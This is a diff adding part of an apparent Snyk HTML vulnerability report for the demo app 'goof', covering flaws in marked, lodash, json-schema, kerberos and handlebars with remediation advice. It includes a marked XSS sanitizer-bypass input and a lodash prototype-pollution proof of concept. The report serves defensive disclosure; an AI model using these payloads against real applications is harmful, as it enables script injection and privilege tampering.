+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>typeorm</code> to version 0.2.25 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/typeorm/typeorm/pull/6096">GitHub PR</a></li>
+        <li><a href="https://hackerone.com/reports/869574">HackerOne Report</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-TYPEORM-590152">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Cross-site Scripting (XSS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            marked
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                goof@1.0.1 and marked@0.3.5
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        marked@0.3.5
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://marked.js.org/">marked</a> is a low-level compiler for parsing markdown without caching or blocking for long periods of time.</p>
+        <p>Affected versions of this package are vulnerable to Cross-site Scripting (XSS). An attacker could bypass its output sanitization (<code>sanitize: true</code>) protection. Using the <a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html#SEC13">HTML Coded Character Set</a>, attackers can inject <code>javascript:</code> code snippets into the output. For example, the following input <code>javascript&amp;#x58document;alert&amp;#40;1&amp;#41;</code>  will result in <code>alert(1)</code> being executed when the user clicks on the link.</p>
+        <h2 id="details">Details</h2>
+        <p>A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.</p>
+        <p>This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.</p>
+        <p>Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.</p>
+        <p>Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, <code>&lt;</code> can be coded as  <code>&amp;lt</code>; and <code>&gt;</code> can be coded as <code>&amp;gt</code>; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses <code>&lt;</code> and <code>&gt;</code> as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.</p>
+        <p>The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. </p>
+        <h3 id="types-of-attacks">Types of attacks</h3>
+        <p>There are a few methods by which XSS can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Stored</strong></td>
+        <td>Server</td>
+        <td>The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.</td>
+        </tr>
+        <tr>
+        <td><strong>Reflected</strong></td>
+        <td>Server</td>
+        <td>The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.</td>
+        </tr>
+        <tr>
+        <td><strong>DOM-based</strong></td>
+        <td>Client</td>
+        <td>The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.</td>
+        </tr>
+        <tr>
+        <td><strong>Mutated</strong></td>
+        <td></td>
+        <td>The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.</td>
+        </tr>
+        </tbody></table>
+        <h3 id="affected-environments">Affected environments</h3>
+        <p>The following environments are susceptible to an XSS attack:</p>
+        <ul>
+        <li>Web servers</li>
+        <li>Application servers</li>
+        <li>Web application environments</li>
+        </ul>
+        <h3 id="how-to-prevent">How to prevent</h3>
+        <p>This section describes the top best practices designed to specifically protect your code: </p>
+        <ul>
+        <li>Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. </li>
+        <li>Convert special characters such as <code>?</code>, <code>&amp;</code>, <code>/</code>, <code>&lt;</code>, <code>&gt;</code> and spaces to their respective HTML or URL encoded equivalents. </li>
+        <li>Give users the option to disable client-side scripts.</li>
+        <li>Redirect invalid requests.</li>
+        <li>Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.</li>
+        <li>Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.</li>
+        <li>Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.</li>
+        </ul>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>marked</code> to version 0.3.6 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/chjj/marked/pull/592/commits/2cff85979be8e7a026a9aca35542c470cf5da523">GitHub Commit</a></li>
+        <li><a href="https://github.com/chjj/marked/pull/592">GitHub PR</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/npm:marked:20150520">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            lodash
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                goof@1.0.1 and lodash@4.17.4
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.4
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-lib-instrument@1.10.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-types@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.10
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-lib-instrument@1.10.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-generator@6.26.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.10
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-lib-instrument@1.10.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-traverse@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.10
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-lib-instrument@1.10.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-template@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.10
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-lib-instrument@1.10.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-generator@6.26.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-types@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.10
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-lib-instrument@1.10.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-traverse@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-types@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.10
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-lib-instrument@1.10.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-template@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-types@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.10
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-lib-instrument@1.10.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-template@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-traverse@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.10
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-lib-instrument@1.10.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-template@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-traverse@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        babel-types@6.26.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash@4.17.10
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/lodash">lodash</a> is a modern JavaScript utility library delivering modularity, performance, &amp; extras.</p>
+        <p>Affected versions of this package are vulnerable to Prototype Pollution. The function <code>zipObjectDeep</code> can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.</p>
+        <h2 id="poc">PoC</h2>
+        <pre><code>const _ = require(&#39;lodash&#39;);
+        _.zipObjectDeep([&#39;__proto__.z&#39;],[123])
+        console.log(z) // 123
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>_proto_</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>_proto_</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>_proto_.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>lodash</code> to version 4.17.20 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12">GitHub Commit</a></li>
+        <li><a href="https://github.com/lodash/lodash/pull/4759">GitHub PR</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-LODASH-567746">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">DLL Injection</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            kerberos
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    goof@1.0.1, mongoose@4.2.4 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        mongoose@4.2.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        mongodb@2.0.46
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        mongodb-core@1.2.19
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        kerberos@0.0.24
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to DLL Injection. An attacker can execute arbitrary code by creating a file with the same name in a folder that precedes the intended file in the DLL path search.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>kerberos</code> to version 1.0.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://www.npmjs.com/advisories/1514">NPM Security Advisory</a></li>
+        <li><a href="https://medium.com/@kiddo_Ha3ker/dll-injection-attack-in-kerberos-npm-package-cb4b32031cd">PoC</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-KERBEROS-568900">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            json-schema
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    goof@1.0.1, tap@11.1.5 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        coveralls@3.0.9
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        request@2.88.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        http-signature@1.2.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        jsprim@1.4.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        json-schema@0.2.3
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Prototype Pollution via the <code>validate</code> function, which when given a special payload will pollute <code>Object</code> with undesired attributes.</p>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>_proto_</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>_proto_</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>_proto_.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>json-schema</code> to version 0.4.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-JSONSCHEMA-1920922">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Arbitrary Code Execution</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            handlebars
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    goof@1.0.1, hbs@4.0.4 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        hbs@4.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        handlebars@4.0.14
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        nyc@11.9.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        istanbul-reports@1.4.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        handlebars@4.0.11
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/handlebars">handlebars</a> is an extension to the Mustache templating language.</p>
+        <p>Affected versions of this package are vulnerable to Arbitrary Code Execution. The package&#39;s lookup helper doesn&#39;t validate templates correctly, allowing attackers to submit templates that execute arbitrary JavaScript in the system.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>handlebars</code> to version 4.5.3, 3.0.8 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://www.npmjs.com/advisories/1316">NPM Security Advisory #1</a></li>
+        <li><a href="https://www.npmjs.com/advisories/1324">NPM Security Advisory #2</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-HANDLEBARS-534478">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Remote Code Execution (RCE)</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
